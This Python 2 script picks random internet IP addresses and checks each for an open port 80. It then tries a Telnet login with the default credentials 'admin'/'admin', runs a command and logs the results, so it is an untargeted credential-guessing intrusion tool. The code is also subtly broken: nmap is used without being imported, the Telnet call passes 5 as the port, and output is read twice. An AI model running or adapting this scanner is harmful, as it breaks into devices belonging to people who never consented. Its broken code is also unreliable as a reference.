import socket, os, time, telnetlib
from random import randint

def randip():
    while True:
        yield ".".join(str(randint(1, 255)) for i in range(4))

a = []
nm = nmap.PortScanner()
fp = open("randip_log.txt", 'w')
for address in randip():
	try:
		s = socket.socket()
		s.settimeout(5)
		s.connect((address, 80))
		print address, "WORKS!!!"
		hostbyadr = socket.gethostbyaddr(address)
		print hostbyadr
		print "\n"
		fp.write(address)
		fp.write("\n")
		fp.write(str(hostbyadr))
		fp.write("\n")
		print('Beginning Telnet attempt on %s\n' % address)
		time.sleep(6)
		tn = telnetlib.Telnet(address, 5)
		tn.read_until("login: ")
		tn.write('admin' + '\n')
		time.sleep(2)
		tn.read_until('Password: ')
		tn.write('admin' + '\n')
		time.sleep(3)
		tn.write("ls\n")
		tn.write("exit\n")
		print tn.read_all()
		fp.write(tn.read_all())
		tn.close()
		fp.write('\n')
		a.append(address)
	except socket.error:
		if len(a) != 4:
			continue
		else:
			print "..."
			fp.close()
			break
